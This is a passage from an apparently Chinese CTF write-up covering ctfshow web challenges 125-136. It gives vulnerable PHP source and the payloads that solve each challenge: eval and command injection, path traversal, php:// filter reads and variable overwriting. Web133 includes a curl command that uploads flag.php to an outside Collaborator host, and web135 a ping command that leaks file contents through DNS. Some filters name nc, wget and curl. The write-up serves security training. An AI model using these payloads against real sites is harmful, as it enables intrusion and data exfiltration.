class="line">$argv,$argc在web模式下不适用</span><br></pre></td></tr></table></figure><p>相当于<code>$a[0]=$_SERVER['QUERY_STRING']</code>，所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  $fl0g&#x3D;flag_give_me;</span><br><span class="line">post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure><p>再来一个非预期解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag</span><br></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get: a&#x3D;1+fl0g&#x3D;flag_give_me</span><br><span class="line">post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入 a=1+fl0g=flag_give_me</span></span><br><span class="line"><span class="comment">//结果如下</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;a=1&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">17</span>) <span class="string">&quot;fl0g=flag_give_me&quot;</span> &#125;</span><br></pre></td></tr></table></figure><h3 id="web125">web125</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, $c)&amp;&amp;$c&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get:  $fl0g&#x3D;flag_give_me;</span><br><span class="line">post:  CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0])</span><br></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?1&#x3D;flag.php</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1])</span><br></pre></td></tr></table></figure><h3 id="web126">web126</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">$a=$_SERVER[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">$c=$_POST[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, $c) &amp;&amp; strlen($c)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>($fl0g===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?a&#x3D;1+fl0g&#x3D;flag_give_me</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1])</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?$fl0g&#x3D;flag_give_me</span><br><span class="line">POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])</span><br></pre></td></tr></table></figure><h3 id="web127">web127**</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$ctf_show = md5($flag);</span><br><span class="line">$url = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//特殊字符检测</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf($url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;嗯哼？&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($ctf_show===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是用123题目的脚本进行爆破：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url,$data</span>)</span>&#123;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">$response = curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line"><span class="keyword">return</span> strlen($response);</span><br><span class="line">&#125;</span><br><span class="line">$url=<span class="string">&quot;http://127.0.0.1/test.php&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt;=<span class="number">128</span> ; $i++) &#123; </span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">0</span>; $j &lt;=<span class="number">128</span> ; $j++) &#123;</span><br><span class="line">$data=<span class="string">&quot;ctf&quot;</span>.urlencode(chr($i)).<span class="string">&quot;show&quot;</span>.<span class="string">&quot;=123&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(curl($url,$data)!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $data.<span class="string">&quot;\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;ctf_show&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果下面这些字符都等同于<code>ctf_show</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ _ [ .</span><br></pre></td></tr></table></figure><p>+在url起到空格的作用，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf show&#x3D;ilove36d</span><br></pre></td></tr></table></figure><h3 id="web128">web128</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123;</span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;嗯哼？&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察点：gettext拓展的使用</p><p>在开启该拓展后 _() 等效于 gettext()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> gettext(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">//结果  phpinfo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> _(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="comment">//结果 phpinfo</span></span><br></pre></td></tr></table></figure><p>因为我们要得到的flag就在flag.php中，所以可以直接用get_defined_vars</p><p><code>?f1=_&amp;f2=get_defined_vars</code></p><h3 id="web129">web129</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = $_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stripos($f, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> readfile($f);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预期解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure><p>非预期解</p><p>PHP伪协议会忽略无效的编码方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h3 id="web131">web131</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">rror_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    $f = (<span class="keyword">String</span>)$_POST[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+?ctfshow/is&#x27;</span>, $f))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stripos($f,<span class="string">&#x27;36Dctfshow&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bye!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用正则最大回溯次数绕过，回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。</p><p>python脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5884fe43-69c8-4cdc-83bf-728fc1e41baf.chall.ctf.show/&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;f&#x27;</span>:<span class="string">&#x27;very&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="web132">web132</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $username = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $code = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($code === mt_rand(<span class="number">1</span>,<span class="number">0x36D</span>) &amp;&amp; $password === $flag || $username ===<span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>($code == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察<code>&amp;&amp;</code>和<code>||</code>运算符的应用。</p><blockquote><p>x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y</p></blockquote><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;admin&amp;b&#x3D;admin&amp;c&#x3D;admin</span><br></pre></td></tr></table></figure><h3 id="web133">web133</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|netcat/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;6个字母都还不够呀?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目挺绕的，主要考察命令执行的骚操作以及外带数据，curl -F的使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">传递参数?F&#x3D;&#96;$F &#96;;sleep 3，可以发现后面的sleep 3这条语句确实执行了。</span><br><span class="line">原因就是：</span><br><span class="line">substr(&#39;&#96;$F&#96;;+sleep 3&#39;, 0, 6) &#x3D; &#96;$F &#96;;</span><br><span class="line">然后再调用eval(&quot;&#96;$F&#96;;&quot;);</span><br><span class="line">此时，$F&#x3D;&#96;$F &#96;;sleep 3</span><br><span class="line">最后执行的代码就是：&#96;&#96;$F &#96;;sleep 3&#96;</span><br></pre></td></tr></table></figure><p>然后就是利用curl带出flag.php。</p><p><code>curl -F </code>将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies）</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;wtt33xn74ddcsjguu6symf2l3c94xt.burpcollaborator.net</span><br></pre></td></tr></table></figure><h3 id="web134">web134</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key1 = <span class="number">0</span>;</span><br><span class="line">$key2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_GET[<span class="string">&#x27;key2&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key1&#x27;</span>]) || <span class="keyword">isset</span>($_POST[<span class="string">&#x27;key2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key1 == <span class="string">&#x27;36d&#x27;</span> &amp;&amp; $key2 == <span class="string">&#x27;36d&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察数组变量覆盖，举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parse_str($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line">var_dump($_POST);</span><br></pre></td></tr></table></figure><p>传入<code>?_POST['a']=123</code>，输出<code>array(1) &#123; [&quot;'a'&quot;]=&gt; string(3) &quot;123&quot; &#125;</code></p><p>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d</span><br></pre></td></tr></table></figure><h3 id="web135">web135</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"><span class="keyword">if</span>($F = @$_GET[<span class="string">&#x27;F&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#x27;</span>, $F))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(substr($F,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web131的升级版，直接把flag.php读出来再重定向到另外一个文件，访问即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+nl flag.php&gt;flag</span><br></pre></td></tr></table></figure><p>另外预期解提到使用Ping命令带出数据，我试了一下没能成功。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?F&#x3D;&#96;$F&#96;;+ping &#96;cat flag.php|awk &#39;NR&#x3D;&#x3D;2&#39;&#96;.yex0qj.dnslog.cn</span><br></pre></td></tr></table></figure><p>但是经过测试单独的ping命令确实是可以执行成功。</p><h3 id="web136">web136</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$x</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span 